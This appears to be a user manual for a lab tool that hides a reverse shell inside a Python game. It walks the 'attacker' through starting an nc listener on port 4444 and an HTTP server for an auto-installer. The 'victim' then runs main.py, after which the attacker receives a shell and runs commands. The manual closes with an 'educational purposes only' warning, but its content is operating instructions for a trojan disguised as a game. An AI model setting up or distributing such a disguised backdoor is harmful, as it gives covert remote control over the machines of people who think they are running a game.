# User Manual & Lab Setup

## Prerequisites
- Python 3.8+
- Network access between the Listener and the Target.

## Lab Setup (Step-by-Step)

### 1. Setup the Listener (Attacker)
On your machine, open a terminal:
```bash
# Start the shell listener
nc -lvnp 4444

# (Optional) Start the asset server for the auto-installer
python3 -m http.server 7950
```

### 2. Execute on Target (Victim)
Run the game:
```bash
python3 main.py
```

### 3. Verify Access
- The game window should open immediately.
- Your listener terminal should receive a connection:
  `Connection from 192.168.x.y ...`
- You can now execute commands like `whoami`, `ls`, or `uname -a`.

## Troubleshooting

### Failed Connection
- Ensure the listener is started *before* the game (though the game will retry).
- Check firewall settings on both machines to allow traffic on port 4444.

### Virtual Environments
If you are using a venv and encounter errors running `cleanup_reset.py`, ensure you are calling it with the correct interpreter:
```bash
# Recommended
python3 cleanup_reset.py
```

## Ethical Warning
This software is for **educational purposes only**. Do not use it on systems you do not own. Always test in isolated virtual machines.
